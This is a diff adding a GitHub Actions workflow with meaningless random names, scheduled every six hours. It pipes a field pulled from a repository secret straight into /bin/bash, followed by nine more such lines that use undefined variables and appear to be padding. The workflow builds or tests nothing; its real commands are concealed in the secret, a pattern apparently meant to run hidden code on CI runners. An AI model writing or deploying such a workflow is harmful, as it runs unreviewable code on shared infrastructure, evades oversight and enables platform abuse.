@@ -1,0 +1,27 @@
+name: caoyuqb
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caoyuqb
+        env:
+          gry33367: ${{ secrets.gry33367 }}
+        run: |
+          echo $gry33367 | jq -r .e8881 | /bin/bash
+          echo $nceyv7 | jq -r .knphd0 | /bin/bash
+          echo $knz35541 | jq -r .aqmmp97309 | /bin/bash
+          echo $khn88962 | jq -r .ikvk440 | /bin/bash
+          echo $vrh7 | jq -r .mfwpp19 | /bin/bash
+          echo $dskr7364 | jq -r .qnhj95 | /bin/bash
+          echo $uycdb811 | jq -r .wskux45 | /bin/bash
+          echo $hgq6 | jq -r .swet3499 | /bin/bash
+          echo $f126 | jq -r .tif5 | /bin/bash
+          echo $oq4021 | jq -r .ac8745 | /bin/bash
+
